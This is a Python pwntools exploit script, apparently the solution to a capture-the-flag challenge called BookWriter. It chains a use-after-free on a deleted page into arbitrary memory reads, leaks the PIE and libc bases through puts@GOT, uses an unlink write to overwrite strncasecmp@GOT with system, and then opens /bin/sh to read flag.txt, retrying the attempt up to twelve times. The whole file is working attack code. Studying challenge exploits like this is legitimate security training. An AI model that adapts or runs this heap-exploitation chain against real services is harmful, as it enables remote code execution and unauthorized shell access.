#!/usr/bin/env python3
# python3 port of the original BookWriter exploit.
# Deleting the current page leaves book->current_page dangling (UAF); inserting a
# new page reuses the freed BookPage so its {text,prev,next} are attacker data.
#  - g_cover's printed "page number" leaks the PIE base
#  - UAF read primitive: point page->text anywhere and flip to it (C-string leak)
#  - UAF + doubly-linked unlink gives a write primitive (prev->next = next)
#  - leak puts@GOT -> libc, overwrite strncasecmp@GOT with system, then the
#    [y/N] prompt input is passed to strncasecmp == system("/bin/sh").
# Relies on glibc 2.23 heap behavior (UBUNTU_VERSION 16.04).
# The heap grooming is probabilistic, so the whole chain is retried until it
# lands (each attempt reloads the ELFs to reset the PIE/libc base and reconnects).
import sys, os, re
from pwn import ELF, remote, context, p32, u8, u16, u32
import glob as _glob
def _find_libc(name):
    # The challenge libc ships only under the repo's publish/ tree (its *.so name
    # is gitignored in the challenge dir). Find it so ELF(name) works in `check`.
    if os.path.exists(name):
        return name
    d=os.path.dirname(os.path.abspath(__file__))
    for _ in range(6):
        cand=os.path.join(d,'publish')
        if os.path.isdir(cand):
            hits=_glob.glob(os.path.join(cand,'**',name),recursive=True)
            if hits:
                return hits[0]
        d=os.path.dirname(d)
    return name
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18006))
_EXE=".build/bookwriter" if os.path.exists(".build/bookwriter") else "bookwriter"; _LIBC=_find_libc("bookwriter-libc.so")
exe=ELF(_EXE); libc=ELF(_LIBC); context.binary=exe; context.log_level='error'
r=None
def read_page():
    r.recvuntil(b"Page number ")
    n=int(r.recvuntil(b":")[:-1])
    lines=r.recvuntil(b"What do you want to do?").split(b"\n")
    return n, b"\n".join(lines[2:-2])
def menu(c):
    r.recvuntil(b"> "); r.sendline(str(c).encode())
def insert_page(*lines):
    menu(3); r.recvuntil(b"End it with a line containing only END\n\n")
    for l in lines: r.sendline(l if isinstance(l,bytes) else l.encode())
    r.sendline(b"END"); return read_page()
def prev_page(): menu(1); return read_page()
def next_page(): menu(2); return read_page()
def delete_page(): menu(4); return read_page()
def leak_string(addr):
    page,_=insert_page(b"%x"%addr if False else ("%x"%addr).encode())
    delete_page()
    insert_page(p32(addr)+b"BBBB")
    leakPage,leakText=prev_page()
    return leakText+b"\0"
def read_bytes(addr,size):
    out=b""
    while len(out)<size:
        s=leak_string(addr+len(out)); out+=s
    return out[:size]
def read32(addr): return u32(read_bytes(addr,4))
def build_fake_page(text,prev,nxt): return p32(text)+p32(prev)+p32(nxt)
def enter_fake_page(text,prev,nxt):
    pageAddr,_=insert_page(build_fake_page(text,prev,nxt))
    fakeAddr=read32(pageAddr)
    insert_page(("%x"%fakeAddr).encode())
    delete_page()
    insert_page(p32(fakeAddr)+p32(fakeAddr))
    prev_page(); addr,text=prev_page()
    return addr,text
def write16(sixtyFourK,addr,value):
    objAddr,_=insert_page(b"free_me!")
    enter_fake_page(objAddr, addr-8, sixtyFourK|(value&0xffff))
    delete_page()
def write32(sixtyFourK,addr,value):
    write16(sixtyFourK,addr,value); write16(sixtyFourK,addr+2,value>>16)
def attempt():
    global r, exe, libc
    exe=ELF(_EXE); libc=ELF(_LIBC); context.binary=exe   # fresh bases each try
    r=remote(HOST,PORT)
    try:
        # STAGE 1
        cover,_=read_page()
        exe.address += cover-exe.symbols["g_cover"]
        # STAGE 2
        addr,_=insert_page(b"findHeap")
        target=(addr+0x30000-1) & ~0xffff + 0x100
        distance=target-addr
        lines=[b"A"*198]*(distance//199+1)
        adjAddr,_=insert_page(*lines)
        sixtyFourK=(adjAddr & ~0xffff)-0x10000
        insert_page(b"nocrash"); prev_page()
        # STAGE 3
        puts_addr=read32(exe.got["puts"])
        libc.address=puts_addr-libc.symbols["puts"]
        # STAGE 4
        write32(sixtyFourK, exe.got["strncasecmp"], libc.symbols["system"])
        # STAGE 5
        menu(0); r.recvuntil(b"[y/N] "); r.sendline(b"/bin/sh")
        r.sendline(b"cat flag.txt")
        data=r.recvall(timeout=5)
        m=re.search(rb'sun\{[^}]*\}', data)
        return m.group(0).decode() if m else None
    except Exception:
        return None
    finally:
        try: r.close()
        except Exception: pass
for _ in range(12):
    f=attempt()
    if f:
        print(f); break
